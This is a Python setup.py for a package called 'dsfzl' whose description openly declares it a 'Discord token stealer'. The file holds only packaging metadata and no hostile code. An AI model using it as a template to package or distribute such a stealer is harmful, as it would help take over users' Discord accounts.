from setuptools import setup

setup(name='dsfzl',
      version='1.0',
      description='Discord token stealer',
      packages=['dsfzl'],
      author_email='nitrobothelper@gmail.com',
      zip_safe=False)